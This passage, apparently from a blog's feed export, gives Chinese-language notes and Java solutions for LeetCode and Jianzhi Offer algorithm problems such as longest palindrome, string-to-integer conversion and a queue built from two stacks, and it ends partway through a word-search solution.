class="type">int</span> end2, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len1</span> <span class="operator">=</span> end1 - start1 + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len2</span> <span class="operator">=</span> end2 - start2 + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//让 len1 的长度小于 len2，这样就能保证如果有数组空了，一定是 len1 </span></span><br><span class="line">        <span class="keyword">if</span> (len1 &gt; len2) <span class="keyword">return</span> getKth(nums2, start2, end2, nums1, start1, end1, k);</span><br><span class="line">        <span class="keyword">if</span> (len1 == <span class="number">0</span>) <span class="keyword">return</span> nums2[start2 + k - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">1</span>) <span class="keyword">return</span> Math.min(nums1[start1], nums2[start2]);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start1 + Math.min(len1, k / <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> start2 + Math.min(len2, k / <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nums1[i] &gt; nums2[j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, start1, end1, nums2, j + <span class="number">1</span>, end2, k - (j - start2 + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, i + <span class="number">1</span>, end1, nums2, start2, end2, k - (i - start1 + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5.最长回文子串"></a>5.<a href="https://leetcode.cn/problems/longest-palindromic-substring/">最长回文子串</a></h1><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;babad&quot;</span><br><span class="line">输出：&quot;bab&quot;</span><br><span class="line">解释：&quot;aba&quot; 同样是符合题意的答案。</span><br></pre></td></tr></table></figure>

<h2 id="思路：动态规划"><a href="#思路：动态规划" class="headerlink" title="思路：动态规划"></a>思路：动态规划</h2><p><a href="https://leetcode.cn/problems/longest-palindromic-substring/solution/zui-chang-hui-wen-zi-chuan-by-leetcode-solution/">详细思路题解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLen</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// dp[i][j] 表示 s[i..j] 是否是回文串</span></span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len][len];</span><br><span class="line">        <span class="comment">// 初始化：所有长度为 1 的子串都是回文串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="comment">// 递推开始</span></span><br><span class="line">        <span class="comment">// 先枚举子串长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">L</span> <span class="operator">=</span> <span class="number">2</span>; L &lt;= len; L++) &#123;</span><br><span class="line">            <span class="comment">// 枚举左边界，左边界的上限设置可以宽松一些</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                <span class="comment">// 由 L 和 i 可以确定右边界，即 j - i + 1 = L 得</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> L + i - <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// 如果右边界越界，就可以退出当前循环</span></span><br><span class="line">                <span class="keyword">if</span> (j &gt;= len) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (charArray[i] != charArray[j]) &#123;</span><br><span class="line">                    dp[i][j] = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        dp[i][j] = dp[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 只要 dp[i][L] == true 成立，就表示子串 s[i..L] 是回文，此时记录回文长度和起始位置</span></span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxLen) &#123;</span><br><span class="line">                    maxLen = j - i + <span class="number">1</span>;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(begin, begin + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-Z-字形变换"><a href="#6-Z-字形变换" class="headerlink" title="6.Z 字形变换"></a>6.<a href="https://leetcode.cn/problems/zigzag-conversion/">Z 字形变换</a></h1><p>将一个给定字符串 s 根据给定的行数 numRows ，以从上往下、从左到右进行 Z 字形排列。</p>
<p>比如输入字符串为 “PAYPALISHIRING” 行数为 3 时，排列如下：</p>
<p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：”PAHNAPLSIIGYIR”。</p>
<p>请你实现这个将字符串进行指定行数变换的函数：</p>
<p>string convert(string s, int numRows);</p>
<h2 id="思路：模拟"><a href="#思路：模拟" class="headerlink" title="思路：模拟"></a>思路：模拟</h2><p><a href="https://leetcode.cn/problems/zigzag-conversion/solution/zzi-xing-bian-huan-by-jyd/">详细思路</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">convert</span><span class="params">(String s, <span class="type">int</span> numRows)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows &lt; <span class="number">2</span> ) <span class="keyword">return</span> s;</span><br><span class="line">        List&lt;StringBuilder&gt; rows = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;StringBuilder&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; numRows ; i++)&#123;</span><br><span class="line">            rows.add(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , flag = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : s.toCharArray())&#123;</span><br><span class="line">            rows.get(i).append(c);</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span> || i == numRows-<span class="number">1</span>) flag = -flag;</span><br><span class="line">            i += flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span>(StringBuilder row: rows) res.append(row);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="7. 整数反转"></a><a href="https://leetcode.cn/problems/reverse-integer/">7. 整数反转</a></h1><blockquote>
<p>给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。</p>
<p>如果反转后整数超过 32 位的有符号整数的范围 [−231,  231 − 1] ，就返回 0。</p>
<p>假设环境不允许存储 64 位整数（有符号或无符号）。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：x = 123</span><br><span class="line">输出：321</span><br></pre></td></tr></table></figure>

<h2 id="思路：取模、考虑溢出"><a href="#思路：取模、考虑溢出" class="headerlink" title="思路：取模、考虑溢出"></a>思路：取模、考虑溢出</h2><p><a href="https://leetcode.cn/problems/reverse-integer/solution/tu-jie-7-zheng-shu-fan-zhuan-by-wang_ni_ma/">详细题解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//每次取末尾数字</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> x%<span class="number">10</span>;</span><br><span class="line">            <span class="comment">//判断是否 大于 最大32位整数</span></span><br><span class="line">            <span class="keyword">if</span> (res&gt;<span class="number">214748364</span> || (res==<span class="number">214748364</span> &amp;&amp; tmp&gt;<span class="number">7</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//判断是否 小于 最小32位整数</span></span><br><span class="line">            <span class="keyword">if</span> (res&lt;-<span class="number">214748364</span> || (res==-<span class="number">214748364</span> &amp;&amp; tmp&lt;-<span class="number">8</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res = res*<span class="number">10</span> + tmp;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;			</span><br></pre></td></tr></table></figure>

<h1 id="8-字符串转换整数-atoi"><a href="#8-字符串转换整数-atoi" class="headerlink" title="8. 字符串转换整数 (atoi)"></a><a href="https://leetcode.cn/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h1><blockquote>
<p>请你来实现一个 myAtoi(string s) 函数，使其能将字符串转换成一个 32 位有符号整数（类似 C&#x2F;C++ 中的 atoi 函数）。</p>
<p>函数 myAtoi(string s) 的算法如下：</p>
<p>读入字符串并丢弃无用的前导空格<br>检查下一个字符（假设还未到字符末尾）为正还是负号，读取该字符（如果有）。 确定最终结果是负数还是正数。 如果两者都不存在，则假定结果为正。<br>读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。<br>将前面步骤读入的这些数字转换为整数（即，”123” -&gt; 123， “0032” -&gt; 32）。如果没有读入数字，则整数为 0 。必要时更改符号（从步骤 2 开始）。<br>如果整数数超过 32 位有符号整数范围 [−231,  231 − 1] ，需要截断这个整数，使其保持在这个范围内。具体来说，小于 −231 的整数应该被固定为 −231 ，大于 231 − 1 的整数应该被固定为 231 − 1 。<br>返回整数作为最终结果。</p>
</blockquote>
<h2 id="思路：自动机"><a href="#思路：自动机" class="headerlink" title="思路：自动机"></a>思路：自动机</h2><p><a href="https://leetcode.cn/problems/string-to-integer-atoi/solution/zi-fu-chuan-zhuan-huan-zheng-shu-atoi-by-leetcode-/">详细题解</a></p>
<p><img src="https://assets.leetcode-cn.com/solution-static/8/fig1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">myAtoi</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">Automaton</span> <span class="variable">automaton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Automaton</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            automaton.get(str.charAt(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) (automaton.sign * automaton.ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Automaton</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">sign</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">state</span> <span class="operator">=</span> <span class="string">&quot;start&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String[]&gt; table = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String[]&gt;() &#123;&#123;</span><br><span class="line">        put(<span class="string">&quot;start&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;start&quot;</span>, <span class="string">&quot;signed&quot;</span>, <span class="string">&quot;in_number&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;signed&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;in_number&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;in_number&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;in_number&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">        put(<span class="string">&quot;end&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;end&quot;</span>&#125;);</span><br><span class="line">    &#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">        state = table.get(state)[get_col(c)];</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;in_number&quot;</span>.equals(state)) &#123;</span><br><span class="line">            ans = ans * <span class="number">10</span> + c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            ans = sign == <span class="number">1</span> ? Math.min(ans, (<span class="type">long</span>) Integer.MAX_VALUE) : Math.min(ans, -(<span class="type">long</span>) Integer.MIN_VALUE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;signed&quot;</span>.equals(state)) &#123;</span><br><span class="line">            sign = c == <span class="string">&#x27;+&#x27;</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">get_col</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;+&#x27;</span> || c == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer专项突击</title>
    <url>/2023/02/14/33-%E5%89%91%E6%8C%87offer%E4%B8%93%E9%A1%B9%E7%AA%81%E5%87%BB/</url>
    <content><![CDATA[<h1 id="剑指-Offer-09-用两个栈实现队列"><a href="#剑指-Offer-09-用两个栈实现队列" class="headerlink" title="剑指 Offer 09. 用两个栈实现队列"></a><a href="https://leetcode.cn/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">剑指 Offer 09. 用两个栈实现队列</a></h1><blockquote>
<p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p>
</blockquote>
<h2 id="思路：两个栈"><a href="#思路：两个栈" class="headerlink" title="思路：两个栈"></a>思路：两个栈</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CQueue</span> &#123;</span><br><span class="line">    LinkedList&lt;Integer&gt; A,B;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        A = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">        B = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">appendTail</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        A.addLast(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteHead</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!B.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">return</span> B.removeLast();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(A.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!A.isEmpty())&#123;</span><br><span class="line">            B.addLast(A.removeLast());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> B.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CQueue obj = new CQueue();</span></span><br><span class="line"><span class="comment"> * obj.appendTail(value);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.deleteHead();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="剑指-Offer-10-I-斐波那契数列"><a href="#剑指-Offer-10-I-斐波那契数列" class="headerlink" title="剑指 Offer 10- I. 斐波那契数列"></a><a href="https://leetcode.cn/problems/fei-bo-na-qi-shu-lie-lcof/">剑指 Offer 10- I. 斐波那契数列</a></h1><blockquote>
<p>写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项（即 F(N)）。斐波那契数列的定义如下：</p>
<p>F(0) &#x3D; 0,   F(1) &#x3D; 1<br>F(N) &#x3D; F(N - 1) + F(N - 2), 其中 N &gt; 1.<br>斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。</p>
<p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p>
</blockquote>
<h2 id="思路：动态规划"><a href="#思路：动态规划" class="headerlink" title="思路：动态规划"></a>思路：动态规划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int fib(int n) &#123;</span><br><span class="line">        int a = 0 , b = 1 , sum;</span><br><span class="line">        for(int i = 2 ; i &lt;= n+1 ; i++)&#123;</span><br><span class="line">            sum = (a + b) %1000000007;</span><br><span class="line">            a = b ;</span><br><span class="line">            b = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（N）</li>
<li>空间复杂度：O（1）</li>
</ul>
<p>注意：听说字节面试要求时间复杂度：logn</p>
<h1 id="剑指-Offer-10-II-青蛙跳台阶问题"><a href="#剑指-Offer-10-II-青蛙跳台阶问题" class="headerlink" title="剑指 Offer 10- II. 青蛙跳台阶问题"></a><a href="https://leetcode.cn/problems/qing-wa-tiao-tai-jie-wen-ti-lcof/">剑指 Offer 10- II. 青蛙跳台阶问题</a></h1><blockquote>
<p>一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。</p>
<p>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。</p>
</blockquote>
<h2 id="思路：动态规划（斐波那契数列）"><a href="#思路：动态规划（斐波那契数列）" class="headerlink" title="思路：动态规划（斐波那契数列）"></a>思路：动态规划（斐波那契数列）</h2><p>还是和上一题一样：</p>
<p><span style='color:orange'>此类求多少可能性的题目一般都具有递推性质：即f（n）和f（n-1）…f（1）之间是有联系的。</span>设跳上 n 级台阶有<br>f(n) 种跳法。在所有跳法中，青蛙的最后一步只有两种情况： </p>
<ul>
<li>跳上 1 级或 2 级台阶。当为 1 级台阶： 剩 n−1 个台阶，此情况共有 f(n−1) 种跳法；</li>
<li>当为 2 级台阶： 剩 n−2 个台阶，此情况共有 f(n−2) 种跳法。</li>
</ul>
<p>f(n) 为以上两种情况之和，即 f(n)&#x3D;f(n−1)+f(n−2) ，以上递推性质为斐波那契数列。和上一题唯一的不同在于初始数字的不同。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numWays</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span> , b = <span class="number">1</span> , sum;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span> ; i &lt;= n+<span class="number">1</span> ; i++)&#123;</span><br><span class="line">            sum = (a + b)%<span class="number">1000000007</span>;</span><br><span class="line">            a = b ;</span><br><span class="line">            b = sum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="剑指-Offer-11-旋转数组的最小数字"><a href="#剑指-Offer-11-旋转数组的最小数字" class="headerlink" title="剑指 Offer 11. 旋转数组的最小数字"></a><a href="https://leetcode.cn/problems/xuan-zhuan-shu-zu-de-zui-xiao-shu-zi-lcof/">剑指 Offer 11. 旋转数组的最小数字</a></h1><blockquote>
<p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。</p>
<p>给你一个可能存在 重复 元素值的数组 numbers ，它原来是一个升序排列的数组，并按上述情形进行了一次旋转。请返回旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一次旋转，该数组的最小值为 1。  </p>
<p>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p>
</blockquote>
<h2 id="思路：二分查找"><a href="#思路：二分查找" class="headerlink" title="思路：二分查找"></a>思路：二分查找</h2><p>本题使用二分查找，但需要考虑特殊情况：</p>
<p>如下图所示，寻找旋转数组的最小元素即为寻找 <strong>右排序数组</strong> 的首个元素 nums[x] ，称 x为 <strong>旋转点</strong></p>
<p><img src="https://pic.leetcode-cn.com/1599404042-JMvjtL-Picture1.png"></p>
<p><span style='color:orange'>当出现 nums[m]&#x3D;nums[j] 时，一定有区间 [i,m] 内所有元素相等 或 区间 [m,j] 内所有元素相等（或两者皆满足）。对于寻找此类数组的最小值问题，可直接放弃二分查找，而使用线性查找替代。</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minArray</span><span class="params">(<span class="type">int</span>[] numbers)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , j = numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> i+(j-i)/<span class="number">2</span>;<span class="comment">//low+high在low和high特别大的时候可能会造成溢出，使用减法避免了溢出发生</span></span><br><span class="line">            <span class="keyword">if</span>(numbers[m] &gt; numbers[j])&#123;</span><br><span class="line">                i = m+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(numbers[m] &lt; numbers[j])&#123;</span><br><span class="line">                j = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> i;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> i+<span class="number">1</span> ; k &lt; j ; k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(numbers[k] &lt; numbers[x])&#123;</span><br><span class="line">                        x = k;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> numbers[x];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numbers[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="剑指-Offer-12-矩阵中的路径"><a href="#剑指-Offer-12-矩阵中的路径" class="headerlink" title="剑指 Offer 12. 矩阵中的路径"></a><a href="https://leetcode.cn/problems/ju-zhen-zhong-de-lu-jing-lcof/">剑指 Offer 12. 矩阵中的路径</a></h1><blockquote>
<p>给定一个 m x n 二维字符网格 board 和一个字符串单词 word 。如果 word 存在于网格中，返回 true ；否则，返回 false 。</p>
<p>单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。</p>
<p>例如，在下面的 3×4 的矩阵中包含单词 “ABCCED”（单词中的字母已标出）。</p>
</blockquote>
<p><img src="https://assets.leetcode.com/uploads/2020/11/04/word2.jpg"></p>
<h2 id="思路：深度优先搜索（DFS）-剪枝"><a href="#思路：深度优先搜索（DFS）-剪枝" class="headerlink" title="思路：深度优先搜索（DFS）+ 剪枝"></a>思路：<strong>深度优先搜索（DFS）+ 剪枝</strong></h2><ul>
<li>深度优先搜索： 可以理解为暴力法遍历矩阵中所有字符串可能性。DFS 通过递归，先朝一个方向搜到底，再回溯至上个节点，沿另一个方向搜索，以此类推。</li>
<li>剪枝： 在搜索中，遇到 这条路不可能和目标字符串匹配成功 的情况（例如：此矩阵元素和目标字符不同、此元素已被访问），则应立即返回，称之为 可行性剪枝 。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] words = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; board.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span> ; j &lt; board[<span class="number">0</span>].length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(dfs(board,words,i,j,<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 